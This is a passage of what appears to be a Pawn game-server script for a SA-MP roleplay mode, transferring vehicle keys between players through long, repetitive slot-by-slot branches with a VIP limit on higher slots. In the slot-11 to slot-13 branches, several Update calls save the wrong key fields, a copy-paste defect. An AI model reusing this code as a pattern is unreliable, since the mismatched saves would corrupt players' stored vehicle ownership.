							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey7] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey7x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 7;
					}
					else if(PlayerInfo[playerid][pCarkey8] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey8] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey8x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 8;
					}
					else if(PlayerInfo[playerid][pCarkey9] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey9] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey9x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 9;
					}
					else if(PlayerInfo[playerid][pCarkey10] == 0)
					{
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey10x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey10] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 10;
					}
					else if(PlayerInfo[playerid][pCarkey11] == 0)
					{
						if(PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "Your account is Standard, you need a VIP account to hold more vehicles.");
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey11x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey11] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 11;
					}
					else if(PlayerInfo[playerid][pCarkey12] == 0)
					{
						if(PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "Your account is Standard, you need a VIP account to hold more vehicles.");
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey12x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey12] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 12;
					}
					else if(PlayerInfo[playerid][pCarkey13] == 0)
					{
						if(PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "Your account is Standard, you need a VIP account to hold more vehicles.");
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pPPluscarkey2];
							PlayerInfo[ofercar[playerid]][pPPluscarkey2] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pPPluscarkey2x);
						}
						if(cartype[playerid] == 7)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey7];
							PlayerInfo[ofercar[playerid]][pCarkey7] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey7x);
						}
						if(cartype[playerid] == 8)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey8];
							PlayerInfo[ofercar[playerid]][pCarkey8] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey8x);
						}
						if(cartype[playerid] == 9)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey9];
							PlayerInfo[ofercar[playerid]][pCarkey9] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey9x);
						}
						if(cartype[playerid] == 10)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey10];
							PlayerInfo[ofercar[playerid]][pCarkey10] = 0;
							Update(playerid,pCarkey10x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 11)
						{
							
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey11];
							PlayerInfo[ofercar[playerid]][pCarkey11] = 0;
							Update(playerid,pCarkey11x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 12)
						{
							
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey12];
							PlayerInfo[ofercar[playerid]][pCarkey12] = 0;
							Update(playerid,pCarkey12x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 13)
						{
							
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey13];
							PlayerInfo[ofercar[playerid]][pCarkey13] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey13x);
						}
						if(cartype[playerid] == 14)
						{
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey14];
							PlayerInfo[ofercar[playerid]][pCarkey14] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey14x);
						}
						if(cartype[playerid] == 15)
						{
							
							PlayerInfo[playerid][pCarkey13] = PlayerInfo[ofercar[playerid]][pCarkey15];
							PlayerInfo[ofercar[playerid]][pCarkey15] = 0;
							Update(playerid,pCarkey13x);
							Update(ofercar[playerid],pCarkey15x);
						}
						vehiculprimit = 13;
					}
					else if(PlayerInfo[playerid][pCarkey14] == 0)
					{
						if(PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "Your account is Standard, you need a VIP account to hold more vehicles.");
						if(cartype[playerid] == 1)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pPcarkey];
							PlayerInfo[ofercar[playerid]][pPcarkey] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pPcarkeyx);
						}
						if(cartype[playerid] == 2)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pmotokey];
							PlayerInfo[ofercar[playerid]][pmotokey] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pmotokeyx);
						}
						if(cartype[playerid] == 3)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pprcarkey];
							PlayerInfo[ofercar[playerid]][pprcarkey] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pprcarkeyx);
						}
						if(cartype[playerid] == 4)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pprcarkey2];
							PlayerInfo[ofercar[playerid]][pprcarkey2] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pprcarkey2x);
						}
						if(cartype[playerid] == 5)
						{
							PlayerInfo[playerid][pCarkey14] = PlayerInfo[ofercar[playerid]][pPPluscarkey];
							PlayerInfo[ofercar[playerid]][pPPluscarkey] = 0;
							Update(playerid,pCarkey14x);
							Update(ofercar[playerid],pPPluscarkeyx);
						}
						if(cartype[playerid] == 6)
						{
